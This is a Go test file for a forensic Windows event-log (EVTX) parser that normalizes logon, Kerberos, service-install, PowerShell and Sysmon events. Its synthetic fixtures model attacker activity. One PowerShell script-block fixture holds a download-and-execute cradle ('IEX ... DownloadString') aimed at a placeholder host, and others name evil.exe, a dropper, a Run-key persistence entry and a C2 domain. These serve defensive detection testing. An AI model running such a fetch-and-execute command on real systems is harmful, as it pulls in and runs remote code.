package evtx_test

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	rawevtx "tracefall/internal/evtx"
	"tracefall/internal/evtx/evtxgen"
	"tracefall/internal/model"
	parser "tracefall/internal/parsers/evtx"
)

var eventTime = time.Date(2026, 1, 15, 9, 15, 30, 0, time.UTC)

func writeLog(t *testing.T, events []evtxgen.Event) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "Security.evtx")
	if err := os.WriteFile(path, evtxgen.Build(events), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

// ev builds a synthetic event with the System fields every record has.
func ev(channel, provider string, eventID int, data map[string]string) evtxgen.Event {
	return evtxgen.Event{
		RecordID:  1,
		Timestamp: eventTime,
		Provider:  provider,
		Channel:   channel,
		Computer:  "WKSTN-042",
		EventID:   eventID,
		ProcessID: 668,
		ThreadID:  1024,
		UserID:    "S-1-5-18",
		Data:      data,
	}
}

func parseOne(t *testing.T, e evtxgen.Event) model.Event {
	t.Helper()
	res, err := parser.New().Parse(writeLog(t, []evtxgen.Event{e}))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) != 1 {
		t.Fatalf("events = %d, want 1", len(res.Events))
	}
	if len(res.Raw) != len(res.Events) {
		t.Fatalf("raw records = %d, events = %d; they must pair 1:1", len(res.Raw), len(res.Events))
	}
	return res.Events[0]
}

func TestDetect(t *testing.T) {
	p := parser.New()
	if !p.Detect("Windows/System32/winevt/Logs/Security.evtx") {
		t.Error("Detect missed a .evtx path")
	}
	if p.Detect("EvtxECmd/20260115_EvtxECmd_Output.csv") {
		t.Error("Detect claimed an EvtxECmd CSV")
	}
	// Content detection is what makes a renamed or extension-less log
	// still discoverable, and a mislabelled one still rejected.
	if !p.DetectContent([]byte("ElfFile\x00")) {
		t.Error("DetectContent missed a real EVTX header")
	}
	if p.DetectContent([]byte("PK\x03\x04")) {
		t.Error("DetectContent accepted a ZIP as an event log")
	}
	if p.DetectContent(nil) {
		t.Error("DetectContent accepted an empty header")
	}
}

// The System block must land on the normalized event: Computer becomes
// Host directly, so no later host backfill is needed.
func TestParse_SystemFieldsAndHost(t *testing.T) {
	got := parseOne(t, ev("Security", "Microsoft-Windows-Security-Auditing", 4624, map[string]string{
		"TargetUserName": "jdoe",
		"LogonType":      "3",
		"IpAddress":      "10.4.2.15",
	}))

	if got.Host != "WKSTN-042" {
		t.Errorf("Host = %q, want WKSTN-042 straight from System/Computer", got.Host)
	}
	if !got.Timestamp.Equal(eventTime) {
		t.Errorf("Timestamp = %v, want %v", got.Timestamp, eventTime)
	}
	if got.ArtifactType != model.ArtifactWindowsEventLog {
		t.Errorf("ArtifactType = %q, want %q", got.ArtifactType, model.ArtifactWindowsEventLog)
	}
	if got.Parser != "evtx@1" {
		t.Errorf("Parser = %q, want evtx@1", got.Parser)
	}
	if got.SourceReference != "record:1" {
		t.Errorf("SourceReference = %q, want record:1", got.SourceReference)
	}
	// EVTX-specific facts belong in Extra, not as new Event fields.
	for k, want := range map[string]string{
		"evtx_record_id":        "1",
		"evtx_channel":          "Security",
		"evtx_computer":         "WKSTN-042",
		"evtx_event_id":         "4624",
		"evtx_process_id":       "668",
		"evtx_thread_id":        "1024",
		"evtx_security_user_id": "S-1-5-18",
		"evtx_provider":         "Microsoft-Windows-Security-Auditing",
	} {
		if got.Extra[k] != want {
			t.Errorf("Extra[%q] = %q, want %q", k, got.Extra[k], want)
		}
	}
}

// Every event family Phase 3 requires must normalize to the event type
// the existing detection rules already consume.
func TestParse_NormalizesEventFamilies(t *testing.T) {
	cases := []struct {
		name     string
		event    evtxgen.Event
		wantType string
		check    func(t *testing.T, e model.Event)
	}{
		{
			name: "Security 4624 logon success",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4624, map[string]string{
				"TargetUserName": "jdoe", "LogonType": "3", "IpAddress": "10.4.2.15",
			}),
			wantType: model.EventLogonSuccess,
			check: func(t *testing.T, e model.Event) {
				if e.User != "jdoe" {
					t.Errorf("User = %q, want jdoe", e.User)
				}
				if e.Extra["logon_type"] != "3" {
					t.Errorf("logon_type = %q", e.Extra["logon_type"])
				}
				if e.NetworkSource != "10.4.2.15" {
					t.Errorf("NetworkSource = %q", e.NetworkSource)
				}
			},
		},
		{
			name: "Security 4625 logon failure",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4625, map[string]string{
				"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "10.9.9.9",
			}),
			wantType: model.EventLogonFailure,
		},
		{
			name: "Security 4648 explicit credentials",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4648, map[string]string{
				"SubjectUserName": "jdoe", "TargetUserName": "svc-backup", "TargetServerName": "SRV-DC01",
			}),
			wantType: model.EventLogonExplicitCreds,
		},
		{
			name: "Security 4672 privileged logon",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4672, map[string]string{
				"SubjectUserName": "administrator", "PrivilegeList": "SeDebugPrivilege",
			}),
			wantType: model.EventPrivilegedLogon,
		},
		{
			name: "Security 4768 Kerberos TGT",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4768, map[string]string{
				"TargetUserName": "jdoe", "IpAddress": "10.4.2.15",
			}),
			wantType: model.EventKerberosTGTRequest,
		},
		{
			name: "Security 4769 Kerberos service ticket",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4769, map[string]string{
				"TargetUserName": "jdoe", "ServiceName": "SRV-FS01$",
			}),
			wantType: model.EventKerberosServiceTicket,
		},
		{
			name: "Security 4776 NTLM",
			event: ev("Security", "Microsoft-Windows-Security-Auditing", 4776, map[string]string{
				"TargetUserName": "jdoe", "Workstation": "WKSTN-042",
			}),
			wantType: model.EventNTLMAuth,
		},
		{
			name: "System 7045 service install",
			event: ev("System", "Service Control Manager", 7045, map[string]string{
				"ServiceName": "AcmeSvc", "ImagePath": `C:\Windows\Temp\acme.exe`, "StartType": "auto start",
			}),
			wantType: model.EventServiceInstall,
			check: func(t *testing.T, e model.Event) {
				if e.Extra["service_name"] != "AcmeSvc" {
					t.Errorf("service_name = %q", e.Extra["service_name"])
				}
				if e.ProcessName != "acme.exe" {
					t.Errorf("ProcessName = %q, want acme.exe", e.ProcessName)
				}
			},
		},
		{
			name: "PowerShell 4104 script block",
			event: ev("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 4104, map[string]string{
				"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
			}),
			wantType: model.EventPowerShellScript,
			check: func(t *testing.T, e model.Event) {
				if e.Extra["log_type"] != "script_block" {
					t.Errorf("log_type = %q, want script_block", e.Extra["log_type"])
				}
			},
		},
		{
			name: "PowerShell 4103 module logging",
			event: ev("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 4103, map[string]string{
				"Payload": "Command invoked",
			}),
			wantType: model.EventPowerShellScript,
		},
		{
			name: "Sysmon 1 process create",
			event: ev("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", 1, map[string]string{
				"Image": `C:\Windows\Temp\evil.exe`, "CommandLine": `evil.exe -run`,
				"ParentImage": `C:\Windows\System32\cmd.exe`, "ProcessId": "4242", "ParentProcessId": "1000",
			}),
			wantType: model.EventProcessCreate,
			check: func(t *testing.T, e model.Event) {
				if e.ProcessName != "evil.exe" || e.ParentProcessName != "cmd.exe" {
					t.Errorf("process/parent = %q/%q", e.ProcessName, e.ParentProcessName)
				}
				if e.PID != 4242 || e.PPID != 1000 {
					t.Errorf("pid/ppid = %d/%d", e.PID, e.PPID)
				}
			},
		},
		{
			name: "Sysmon 3 network connect",
			event: ev("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", 3, map[string]string{
				"Image": `C:\Windows\Temp\evil.exe`, "DestinationIp": "203.0.113.10", "DestinationPort": "443",
			}),
			wantType: model.EventNetworkConnection,
			check: func(t *testing.T, e model.Event) {
				if e.NetworkDest != "203.0.113.10" || e.NetworkDestPort != 443 {
					t.Errorf("dest = %q:%d", e.NetworkDest, e.NetworkDestPort)
				}
			},
		},
		{
			name: "Sysmon 11 file create",
			event: ev("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", 11, map[string]string{
				"Image": `C:\Windows\Temp\dropper.exe`, "TargetFilename": `C:\Users\jdoe\AppData\payload.dll`,
			}),
			wantType: model.EventFileCreate,
		},
		{
			name: "Sysmon 13 registry set to a Run key",
			event: ev("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", 13, map[string]string{
				"TargetObject": `HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater`,
				"Details":      `C:\Users\jdoe\AppData\updater.exe`,
			}),
			wantType: model.EventRegistryRunKey,
		},
		{
			name: "Sysmon 22 DNS query",
			event: ev("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", 22, map[string]string{
				"Image": `C:\Windows\Temp\evil.exe`, "QueryName": "c2.example.test",
			}),
			wantType: model.EventDNSQuery,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := parseOne(t, tc.event)
			if got.EventType != tc.wantType {
				t.Fatalf("EventType = %q, want %q", got.EventType, tc.wantType)
			}
			if got.Host != "WKSTN-042" {
				t.Errorf("Host = %q, want WKSTN-042", got.Host)
			}
			if tc.check != nil {
				tc.check(t, got)
			}
		})
	}
}

// A channel/EventID pair with no mapping must be skipped, not emitted as
// an under-specified event -- the same rule the CSV parser follows.
func TestParse_UnmappedEventIsNotEmitted(t *testing.T) {
	res, err := parser.New().Parse(writeLog(t, []evtxgen.Event{
		ev("Application", "SomeApp", 9999, map[string]string{"Detail": "routine"}),
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 0 {
		t.Errorf("events = %d, want 0 for an unmapped event ID: %+v", len(res.Events), res.Events)
	}
}

// A partially recovered file must never look like a clean one.
func TestParse_PartialRecoveryIsFlagged(t *testing.T) {
	var events []evtxgen.Event
	for i := 0; i < 600; i++ {
		e := ev("Security", "Microsoft-Windows-Security-Auditing", 4624, map[string]string{"TargetUserName": "jdoe"})
		e.RecordID = uint64(i + 1)
		events = append(events, e)
	}
	log := evtxgen.Build(events)
	path := filepath.Join(t.TempDir(), "damaged.evtx")
	if err := os.WriteFile(path, evtxgen.CorruptChunkCRC(log, 0), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := parser.New().Parse(path)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(res.Events) == 0 {
		t.Fatal("no events recovered from the undamaged chunks")
	}
	note := res.Events[0].Extra["evtx_partial_parse"]
	if note == "" {
		t.Error("a partially recovered file produced events with no evtx_partial_parse note")
	}
	if res.Events[0].Confidence >= 1.0 {
		t.Errorf("Confidence = %v; a partial parse should not claim full confidence", res.Events[0].Confidence)
	}
	t.Logf("partial-parse note: %s", note)
}

func TestParse_MalformedFileIsAnError(t *testing.T) {
	path := filepath.Join(t.TempDir(), "bogus.evtx")
	if err := os.WriteFile(path, []byte("this is not an event log"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := parser.New().Parse(path); err == nil {
		t.Error("expected an error parsing a file that is not an EVTX")
	}
}

// Parsing the same file twice must produce identical events, including
// identical dedup identities -- re-analysis depends on it.
func TestParse_IsDeterministic(t *testing.T) {
	path := writeLog(t, []evtxgen.Event{
		ev("Security", "Microsoft-Windows-Security-Auditing", 4624, map[string]string{
			"TargetUserName": "jdoe", "LogonType": "3", "IpAddress": "10.4.2.15",
		}),
	})
	first, err := parser.New().Parse(path)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 3; i++ {
		again, err := parser.New().Parse(path)
		if err != nil {
			t.Fatal(err)
		}
		if len(again.Events) != len(first.Events) {
			t.Fatalf("run %d produced %d events, first run %d", i, len(again.Events), len(first.Events))
		}
		for j := range first.Events {
			if a, b := first.Events[j].ComputeDedupHash(), again.Events[j].ComputeDedupHash(); a != b {
				t.Fatalf("run %d event %d has dedup hash %s, first run %s", i, j, b, a)
			}
		}
	}
}

// The parser must not hold a whole file in memory: Open reads only the
// header, so discovery can classify a large log cheaply.
func TestOpen_DoesNotReadRecords(t *testing.T) {
	path := writeLog(t, []evtxgen.Event{ev("Security", "p", 4624, map[string]string{"TargetUserName": "x"})})
	f, err := rawevtx.Open(path, rawevtx.Limits{})
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if f.ChunkCount() == 0 {
		t.Error("ChunkCount = 0 for a log with records")
	}
}
